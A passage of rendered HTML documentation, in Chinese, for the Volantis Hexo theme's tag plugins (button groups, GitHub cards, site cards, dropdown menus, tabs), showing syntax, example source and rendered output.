id="btns-2"><p>样式参数位置可以写图片样式、布局方式，多个样式参数用空格隔开。</p><p class='p subtitle'>圆角样式</p><p>默认为方形</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rounded, circle</span><br></pre></td></tr></table></figure><p class='p subtitle'>布局方式</p><p>默认为自动宽度，适合视野内只有一两个的情况。</p><div class="table"><table><thead><tr><th align="left">参数</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">wide</td><td align="left">宽一点的按钮</td></tr><tr><td align="left">fill</td><td align="left">填充布局，自动铺满至少一行，多了会换行。</td></tr><tr><td align="left">center</td><td align="left">居中，按钮之间是固定间距。</td></tr><tr><td align="left">around</td><td align="left">居中分散</td></tr><tr><td align="left">grid2</td><td align="left">等宽最多2列，屏幕变窄会适当减少列数。</td></tr><tr><td align="left">grid3</td><td align="left">等宽最多3列，屏幕变窄会适当减少列数。</td></tr><tr><td align="left">grid4</td><td align="left">等宽最多4列，屏幕变窄会适当减少列数。</td></tr><tr><td align="left">grid5</td><td align="left">等宽最多5列，屏幕变窄会适当减少列数。</td></tr></tbody></table></div><p class='p subtitle'>增加文字样式</p><p>可以在容器内增加 <code>&lt;b&gt;标题&lt;/b&gt;</code> 和 <code>&lt;p&gt;描述文字&lt;/p&gt;</code></p></div><div class="tab-pane" id="btns-3"><p>如果需要显示类似「团队成员」之类的一组含有头像的链接：</p><figure class="highlight md"><figcaption><span>example.md:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns circle grid5 %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><p>或者含有图标的按钮：</p><figure class="highlight md"><figcaption><span>example.md:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns rounded grid5 %&#125;</span><br><span class="line">&#123;% cell 下载源码, /, fas fa-download %&#125;</span><br><span class="line">&#123;% cell 查看文档, /, fas fa-book-open %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><p>圆形图标 + 标题 + 描述 + 图片 + 网格5列 + 居中</p><figure class="highlight md"><figcaption><span>example.md:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns circle center grid5 %&#125;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://apps.apple.com/cn/app/heart-mate-pro-hrm-utility/id1463348922?ls=1&#x27;</span>&gt;</span></span></span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&#x27;fab fa-apple&#x27;</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span></span>心率管家<span class="xml"><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">  &#123;% p red, 专业版 %&#125;</span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/qrcode/heartmate_pro.png&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://apps.apple.com/cn/app/heart-mate-lite-hrm-utility/id1475747930?ls=1&#x27;</span>&gt;</span></span></span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&#x27;fab fa-apple&#x27;</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span></span>心率管家<span class="xml"><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">  &#123;% p green, 免费版 %&#125;</span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/qrcode/heartmate_lite.png&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane active" id="btns-4"><p>如果需要显示类似「团队成员」之类的一组含有头像的链接：</p><div class="btns circle grid5">            <a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a>          </div><p>或者含有图标的按钮：</p><div class="btns rounded grid5">            <a class="button" href='/' title='下载源码'><i class='fas fa-download'></i>下载源码</a><a class="button" href='/' title='查看文档'><i class='fas fa-book-open'></i>查看文档</a>          </div><p>圆形图标 + 标题 + 描述 + 图片 + 网格5列 + 居中</p><div class="btns circle center grid5">            <a href='https://apps.apple.com/cn/app/heart-mate-pro-hrm-utility/id1463348922?ls=1'>  <i class='fab fa-apple'></i>  <b>心率管家</b>  <p class='p red'>专业版</p>  <img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/qrcode/heartmate_pro.png'></a><a href='https://apps.apple.com/cn/app/heart-mate-lite-hrm-utility/id1475747930?ls=1'>  <i class='fab fa-apple'></i>  <b>心率管家</b>  <p class='p green'>免费版</p>  <img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/qrcode/heartmate_lite.png'></a>          </div></div></div></div><br><h2 id="ghcard"><a href="#ghcard" class="headerlink" title="ghcard"></a>ghcard</h2><figure class="highlight md"><figcaption><span>最后更新于 <u>4.0</u> 版本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ghcard 用户名, 其它参数（可选） %&#125;</span><br><span class="line">&#123;% ghcard 用户名/仓库, 其它参数（可选） %&#125;</span><br></pre></td></tr></table></figure><h3 id="用户信息卡片"><a href="#用户信息卡片" class="headerlink" title="用户信息卡片"></a>用户信息卡片</h3><table><thead><tr><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/xaoxuu"><img src="https://github-readme-stats.vercel.app/api/?username=xaoxuu&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/?username=xaoxuu&show_owner=true" srcset="data:image/png;base64,666"/></a></th><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/xaoxuu"><img src="https://github-readme-stats.vercel.app/api/?username=xaoxuu&theme=vue&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/?username=xaoxuu&theme=vue&show_owner=true" srcset="data:image/png;base64,666"/></a></th></tr></thead><tbody><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/xaoxuu"><img src="https://github-readme-stats.vercel.app/api/?username=xaoxuu&theme=buefy&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/?username=xaoxuu&theme=buefy&show_owner=true" srcset="data:image/png;base64,666"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/xaoxuu"><img src="https://github-readme-stats.vercel.app/api/?username=xaoxuu&theme=solarized-light&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/?username=xaoxuu&theme=solarized-light&show_owner=true" srcset="data:image/png;base64,666"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/xaoxuu"><img src="https://github-readme-stats.vercel.app/api/?username=xaoxuu&theme=onedark&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/?username=xaoxuu&theme=onedark&show_owner=true" srcset="data:image/png;base64,666"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/xaoxuu"><img src="https://github-readme-stats.vercel.app/api/?username=xaoxuu&theme=solarized-dark&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/?username=xaoxuu&theme=solarized-dark&show_owner=true" srcset="data:image/png;base64,666"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/xaoxuu"><img src="https://github-readme-stats.vercel.app/api/?username=xaoxuu&theme=algolia&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/?username=xaoxuu&theme=algolia&show_owner=true" srcset="data:image/png;base64,666"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/xaoxuu"><img src="https://github-readme-stats.vercel.app/api/?username=xaoxuu&theme=calm&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/?username=xaoxuu&theme=calm&show_owner=true" srcset="data:image/png;base64,666"/></a></td></tr></tbody></table><p>上述示例的源码：</p><figure class="highlight md"><figcaption><span>example:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| &#123;% ghcard xaoxuu %&#125; | &#123;% ghcard xaoxuu, theme=vue %&#125; |</span><br><span class="line">| -- | -- |</span><br><span class="line">| &#123;% ghcard xaoxuu, theme=buefy %&#125; | &#123;% ghcard xaoxuu, theme=solarized-light %&#125; |</span><br><span class="line">| &#123;% ghcard xaoxuu, theme=onedark %&#125; | &#123;% ghcard xaoxuu, theme=solarized-dark %&#125; |</span><br><span class="line">| &#123;% ghcard xaoxuu, theme=algolia %&#125; | &#123;% ghcard xaoxuu, theme=calm %&#125; |</span><br></pre></td></tr></table></figure><h3 id="仓库信息卡片"><a href="#仓库信息卡片" class="headerlink" title="仓库信息卡片"></a>仓库信息卡片</h3><table><thead><tr><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&show_owner=true" srcset="data:image/png;base64,666"/></a></th><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=vue&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=vue&show_owner=true" srcset="data:image/png;base64,666"/></a></th></tr></thead><tbody><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=buefy&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=buefy&show_owner=true" srcset="data:image/png;base64,666"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-light&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-light&show_owner=true" srcset="data:image/png;base64,666"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=onedark&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=onedark&show_owner=true" srcset="data:image/png;base64,666"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-dark&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-dark&show_owner=true" srcset="data:image/png;base64,666"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=algolia&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=algolia&show_owner=true" srcset="data:image/png;base64,666"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=calm&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=calm&show_owner=true" srcset="data:image/png;base64,666"/></a></td></tr></tbody></table><p>上述示例的源码：</p><figure class="highlight md"><figcaption><span>example:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=vue %&#125; |</span><br><span class="line">| -- | -- |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=buefy %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-light %&#125; |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=onedark %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-dark %&#125; |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=algolia %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=calm %&#125; |</span><br></pre></td></tr></table></figure><h3 id="更多参数选择"><a href="#更多参数选择" class="headerlink" title="更多参数选择"></a>更多参数选择</h3><div class="tag link"><a class="link-card" title="GitHub 卡片 API 参数" href="https://github-readme-stats.vercel.app"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/png;base64,666"/></div><div class="right"><p class="text">GitHub 卡片 API 参数</p><p class="url">https://github-readme-stats.vercel.app</p></div></a></div><br><h2 id="site"><a href="#site" class="headerlink" title="site"></a>site</h2><figure class="highlight md"><figcaption><span>最后更新于 <u>4.0</u> 版本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% sitegroup %&#125;</span><br><span class="line">&#123;% site 标题, url=链接, screenshot=截图链接, avatar=头像链接（可选）, description=描述（可选） %&#125;</span><br><span class="line">&#123;% site 标题, url=链接, screenshot=截图链接, avatar=头像链接（可选）, description=描述（可选） %&#125;</span><br><span class="line">&#123;% endsitegroup %&#125;</span><br></pre></td></tr></table></figure><h3 id="演示效果-7"><a href="#演示效果-7" class="headerlink" title="演示效果"></a>演示效果</h3><div class="site-card-group"><a class="site-card" href="https://xaoxuu.com"><div class="img"><img src="https://i.loli.net/2020/08/21/VuSwWZ1xAeUHEBC.jpg" class="lazyload" data-srcset="https://i.loli.net/2020/08/21/VuSwWZ1xAeUHEBC.jpg" srcset="data:image/png;base64,666"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png" srcset="data:image/png;base64,666"/><span class="title">xaoxuu</span><span class="desc">简约风格</span></div></a><a class="site-card" href="https://inkss.cn"><div class="img"><img src="https://i.loli.net/2020/08/21/Vzbu3i8fXs6Nh5Y.jpg" class="lazyload" data-srcset="https://i.loli.net/2020/08/21/Vzbu3i8fXs6Nh5Y.jpg" srcset="data:image/png;base64,666"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/inkss/common@master/static/web/avatar.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/inkss/common@master/static/web/avatar.jpg" srcset="data:image/png;base64,666"/><span class="title">inkss</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://blog.mhuig.top"><div class="img"><img src="https://i.loli.net/2020/08/22/d24zpPlhLYWX6D1.png" class="lazyload" data-srcset="https://i.loli.net/2020/08/22/d24zpPlhLYWX6D1.png" srcset="data:image/png;base64,666"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/MHuiG/imgbed@master/data/p.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/MHuiG/imgbed@master/data/p.png" srcset="data:image/png;base64,666"/><span class="title">MHuiG</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://colsrch.top"><div class="img"><img src="https://i.loli.net/2020/08/22/dFRWXm52OVu8qfK.png" class="lazyload" data-srcset="https://i.loli.net/2020/08/22/dFRWXm52OVu8qfK.png" srcset="data:image/png;base64,666"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/Colsrch/images/Colsrch/avatar.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/Colsrch/images/Colsrch/avatar.jpg" srcset="data:image/png;base64,666"/><span class="title">Colsrch</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://linhk1606.github.io"><div class="img"><img src="https://i.loli.net/2020/08/21/3PmGLCKicnfow1x.png" class="lazyload" data-srcset="https://i.loli.net/2020/08/21/3PmGLCKicnfow1x.png" srcset="data:image/png;base64,666"/></div><div class="info"><img src="https://i.loli.net/2020/02/09/PN7I5RJfFtA93r2.png" class="lazyload" data-srcset="https://i.loli.net/2020/02/09/PN7I5RJfFtA93r2.png" srcset="data:image/png;base64,666"/><span class="title">Linhk1606</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a></div><h3 id="上述示例的源码-8"><a href="#上述示例的源码-8" class="headerlink" title="上述示例的源码"></a>上述示例的源码</h3><figure class="highlight md"><figcaption><span>example:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% sitegroup %&#125;</span><br><span class="line">&#123;% site xaoxuu, url=https://xaoxuu.com, screenshot=https://i.loli.net/2020/08/21/VuSwWZ1xAeUHEBC.jpg, avatar=https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png, description=简约风格 %&#125;</span><br><span class="line">&#123;% site inkss, url=https://inkss.cn, screenshot=https://i.loli.net/2020/08/21/Vzbu3i8fXs6Nh5Y.jpg, avatar=https://cdn.jsdelivr.net/gh/inkss/common@master/static/web/avatar.jpg, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site MHuiG, url=https://blog.mhuig.top, screenshot=https://i.loli.net/2020/08/22/d24zpPlhLYWX6D1.png, avatar=https://cdn.jsdelivr.net/gh/MHuiG/imgbed@master/data/p.png, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site Colsrch, url=https://colsrch.top, screenshot=https://i.loli.net/2020/08/22/dFRWXm52OVu8qfK.png, avatar=https://cdn.jsdelivr.net/gh/Colsrch/images/Colsrch/avatar.jpg, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site Linhk1606, url=https://linhk1606.github.io, screenshot=https://i.loli.net/2020/08/21/3PmGLCKicnfow1x.png, avatar=https://i.loli.net/2020/02/09/PN7I5RJfFtA93r2.png, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% endsitegroup %&#125;</span><br></pre></td></tr></table></figure><br><h2 id="dropmenu"><a href="#dropmenu" class="headerlink" title="dropmenu"></a>dropmenu</h2><div class="note warning"><p>这个页面的标签将会在不久后重构</p></div><h3 id="下拉菜单"><a href="#下拉菜单" class="headerlink" title="下拉菜单"></a>下拉菜单</h3><p>请将您的 Volantis 升级至 <u>3.0</u> 版本以上使用。</p><div class="tabs" id="menu"><ul class="nav-tabs"><li class="tab"><a class="#menu-1">语法格式</a></li><li class="tab"><a class="#menu-2">示例写法</a></li><li class="tab active"><a class="#menu-3">示例效果</a></li></ul><div class="tab-content"><div class="tab-pane" id="menu-1"><p class='p subtitle'>容器</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% menu 前缀（可省略）, 标题, 后缀（可省略） %&#125;</span><br><span class="line">菜单内容</span><br><span class="line">&#123;% endmenu %&#125;</span><br></pre></td></tr></table></figure><p class='p subtitle'>菜单内容</p><p>菜单项</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% menuitem 文本, 链接, 图标 %&#125;</span><br></pre></td></tr></table></figure><p>分割线</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% menuitem hr %&#125;</span><br></pre></td></tr></table></figure><p>子菜单</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% submenu 嵌套菜单, 图标 %&#125;</span><br><span class="line">菜单内容</span><br><span class="line">&#123;% endsubmenu %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="menu-2"><p class='p subtitle'>示例1</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% menu 下拉菜单 %&#125;</span><br><span class="line">&#123;% menuitem 主题源码, https://github.com/volantis-x/hexo-theme-volantis/, fas fa-file-code %&#125;</span><br><span class="line">&#123;% menuitem 更新日志, https://github.com/volantis-x/hexo-theme-volantis/releases/, fas fa-clipboard-list %&#125;</span><br><span class="line">&#123;% menuitem hr %&#125;</span><br><span class="line">&#123;% submenu 有疑问？, fas fa-question-circle %&#125;</span><br><span class="line">&#123;% menuitem 看 FAQ, /faqs/ %&#125;</span><br><span class="line">&#123;% menuitem 看 本站源码, https://github.com/volantis-x/volantis-docs/ %&#125;</span><br><span class="line">&#123;% menuitem 提 Issue, https://github.com/volantis-x/hexo-theme-volantis/issues/ %&#125;</span><br><span class="line">&#123;% endsubmenu %&#125;</span><br><span class="line">&#123;% endmenu %&#125;</span><br></pre></td></tr></table></figure><p class='p subtitle'>示例2</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% menu 这个是, 下拉菜单 %&#125;</span><br><span class="line">（同上）</span><br><span class="line">&#123;% endmenu %&#125;</span><br></pre></td></tr></table></figure><p class='p subtitle'>示例3</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% menu 这个是, 下拉菜单, 的示例效果。 %&#125;</span><br><span class="line">（同上）</span><br><span class="line">&#123;% endmenu %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane active" id="menu-3"><p class='p subtitle'>示例1</p><div class='dropmenu-wrapper'>              <div class='dropmenu'>                <a>下拉菜单</a>                <ul class='list-v'>                  <li>                <a class='menuitem' href='https://github.com/volantis-x/hexo-theme-volantis/' title='主题源码'>                  <i class='fas fa-file-code fa-fw'></i>                  主题源码                </a>              </li><li>                <a class='menuitem' href='https://github.com/volantis-x/hexo-theme-volantis/releases/' title='更新日志'>                  <i class='fas fa-clipboard-list fa-fw'></i>                  更新日志                </a>              </li><hr><li>              <a class='menuitem'>                <i class=' fas fa-question-circle fa-fw'></i>                有疑问？              </a>              <ul class='list-v'>                <li>                <a class='menuitem' href='/faqs/' title='看 FAQ'>                  看 FAQ                </a>              </li><li>                <a class='menuitem' href='https://github.com/volantis-x/volantis-docs/' title='看 本站源码'>                  看 本站源码                </a>              </li><li>                <a class='menuitem' href='https://github.com/volantis-x/hexo-theme-volantis/issues/' title='提 Issue'>                  提 Issue                </a>              </li>              </ul>            </li>                </ul>              </div>            </div><p class='p subtitle'>示例2</p><div class='dropmenu-wrapper'>              <span>这个是</span>              <div class='dropmenu'>                <a>下拉菜单</a>                <ul class='list-v'>                  <li>                <a class='menuitem' href='https://github.com/volantis-x/hexo-theme-volantis/' title='主题源码'>                  <i class='fas fa-file-code fa-fw'></i>                  主题源码                </a>              </li><li>                <a class='menuitem' href='https://github.com/volantis-x/hexo-theme-volantis/releases/' title='更新日志'>                  <i class='fas fa-clipboard-list fa-fw'></i>                  更新日志                </a>              </li><hr><li>              <a class='menuitem'>                <i class=' fas fa-question-circle fa-fw'></i>                有疑问？              </a>              <ul class='list-v'>                <li>                <a class='menuitem' href='/faqs/' title='看 FAQ'>                  看 FAQ                </a>              </li><li>                <a class='menuitem' href='https://github.com/volantis-x/volantis-docs/' title='看 本站源码'>                  看 本站源码                </a>              </li><li>                <a class='menuitem' href='https://github.com/volantis-x/hexo-theme-volantis/issues/' title='提 Issue'>                  提 Issue                </a>              </li>              </ul>            </li>                </ul>              </div>            </div><p class='p subtitle'>示例3</p><div class='dropmenu-wrapper'>              <span>这个是</span>              <div class='dropmenu'>                <a>下拉菜单</a>                <ul class='list-v'>                  <li>                <a class='menuitem' href='https://github.com/volantis-x/hexo-theme-volantis/' title='主题源码'>                  <i class='fas fa-file-code fa-fw'></i>                  主题源码                </a>              </li><li>                <a class='menuitem' href='https://github.com/volantis-x/hexo-theme-volantis/releases/' title='更新日志'>                  <i class='fas fa-clipboard-list fa-fw'></i>                  更新日志                </a>              </li><hr><li>              <a class='menuitem'>                <i class=' fas fa-question-circle fa-fw'></i>                有疑问？              </a>              <ul class='list-v'>                <li>                <a class='menuitem' href='/faqs/' title='看 FAQ'>                  看 FAQ                </a>              </li><li>                <a class='menuitem' href='https://github.com/volantis-x/volantis-docs/' title='看 本站源码'>                  看 本站源码                </a>              </li><li>                <a class='menuitem' href='https://github.com/volantis-x/hexo-theme-volantis/issues/' title='提 Issue'>                  提 Issue                </a>              </li>              </ul>            </li>                </ul>              </div>              <span>的示例效果。</span>            </div></div></div></div><br><h2 id="tab"><a href="#tab" class="headerlink" title="tab"></a>tab</h2><p>此插件移植自 <a href="https://theme-next.org/docs/tag-plugins/tabs">NexT #tabs</a></p><figure class="highlight md"><figcaption><span>最后更新于 <u>2.1</u> 版本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs 页面内不重复的ID %&#125;</span><br><span class="line">&lt;!-- tab 栏目1 --&gt;</span><br><span class="line">内容</span><br><span 